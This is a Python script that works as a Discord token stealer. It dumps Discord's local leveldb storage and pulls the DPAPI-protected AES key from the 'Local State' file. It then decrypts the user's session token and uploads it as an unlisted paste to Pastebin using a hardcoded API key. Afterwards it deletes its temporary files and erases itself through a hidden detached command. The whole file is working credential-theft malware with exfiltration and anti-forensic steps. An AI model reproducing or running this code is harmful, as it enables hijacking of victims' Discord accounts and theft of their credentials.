from ccl_chromium_reader.storage_formats import ccl_leveldb
from pathlib import Path
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import requests
import os
import sys

home = Path.home()
db = ccl_leveldb.RawLevelDb(rf"{home}\AppData\Roaming\discord\Local Storage\leveldb")

with open(rf"{home}\AppData\Roaming\discord\dump.txt", "w", encoding="utf-8") as f:
    for record in db.iterate_records_raw():
        if record.state == ccl_leveldb.KeyState.Live:
            f.write(f"{record.key!r} -> {record.value!r}\n")




# ----------------------------
# TXT EXTRACT (streaming)
# ----------------------------
def extract_txt(file_path):
    key_pattern = '"1501230568938147953":"dQw4w9WgXcQ:'
    result = None

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        buffer = ""

        while True:
            chunk = f.read(1024 * 1024)
            if not chunk:
                break

            buffer += chunk
            start = 0

            while True:
                idx = buffer.find(key_pattern, start)
                if idx == -1:
                    break

                value_start = idx + len(key_pattern)
                end = buffer.find('"', value_start)

                if end != -1:
                    result = buffer[value_start:end]
                    return [result]  # STOP IMMEDIATELY

                start = idx + 1

            buffer = buffer[-len(key_pattern):]

    return []


# ----------------------------
# JSON EXTRACT (REAL JSON)
# ----------------------------
def extract_json(file_path):
    results = []

    with open(file_path, "r", encoding="utf-8") as f:
        data = json.load(f)

    def walk(obj):
        if isinstance(obj, dict):

            # direct key extraction
            if "encrypted_key" in obj:
                results.append(obj["encrypted_key"])

            for v in obj.values():
                walk(v)

        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return results


# ----------------------------
# MERGE RESULTS
# ----------------------------
def merge(txt_vals, json_vals):
    output = []
    max_len = max(len(txt_vals), len(json_vals))

    for i in range(max_len):
        output.append({
            "1": txt_vals[i] if i < len(txt_vals) else None,
            "2": json_vals[i] if i < len(json_vals) else None
        })

    return output


# ----------------------------
# RUN EVERYTHING
# ----------------------------
txt_vals = extract_txt(fr"{home}\AppData\Roaming\discord\dump.txt")
json_vals = extract_json(fr"{home}\AppData\Roaming\discord\Local State")  # no .json needed

final = merge(txt_vals, json_vals)

with open(rf"{home}\AppData\Roaming\discord\output.json", "w", encoding="utf-8") as f:
    json.dump(final, f, indent=2)


with open(rf"{home}\AppData\Roaming\discord\output.json", "r", encoding="utf-8") as f:
    data = json.load(f)

token_b64 = data[0]["1"]
encrypted_key_b64 = data[0]["2"]

# Decrypt the AES key
encrypted_key = base64.b64decode(encrypted_key_b64)
encrypted_key = encrypted_key[5:] 
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt the token
payload = base64.b64decode(token_b64)
iv = payload[3:15]
ciphertext = payload[15:-16]
tag = payload[-16:]

cipher = AES.new(key, AES.MODE_GCM, iv)
decrypted = cipher.decrypt_and_verify(ciphertext, tag)


def post_to_pastebin(content, title="", api_key="2SJTYiO4tshVERRRgLfidFkQGqbZu532"):
    url = "https://pastebin.com/api/api_post.php"
    
    payload = {
        "api_dev_key": api_key,        # Your Pastebin API key
        "api_option": "paste",          # Action to perform
        "api_paste_code": content,      # The string to post
        "api_paste_private": "1",       # 0=public, 1=unlisted, 2=private
        "api_paste_name": title,        # Optional title
        "api_paste_expire_date": "N",   # N=never, 1D=1 day, 1W=1 week, etc.
    }
    
    response = requests.post(url, data=payload)
    
    if response.status_code == 200 and response.text.startswith("https://"):
        return response.text.strip()  # Returns the paste URL
    else:
        raise Exception(f"Error: {response.text}")

# Usage
toke2n = decrypted.decode()
print(toke2n)
url = post_to_pastebin(toke2n, title="Fun.")

path = Path.home() / "AppData" / "Roaming" / "discord" / "dump.txt"
path.unlink()
from pathlib import Path

path = Path.home() / "AppData" / "Roaming" / "discord" / "output.json"
path.unlink()

# Self-delete (cross-platform, subprocess-safe)
if sys.platform == "win32":
    import subprocess
    # Spawn a detached cmd process that waits briefly then deletes the file
    script_path = os.path.abspath(__file__)
    subprocess.Popen(
        f'cmd /c ping 127.0.0.1 -n 2 >nul && del /f /q "{script_path}"',
        shell=True,
        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
    )
else:
    os.remove(os.path.abspath(__file__))
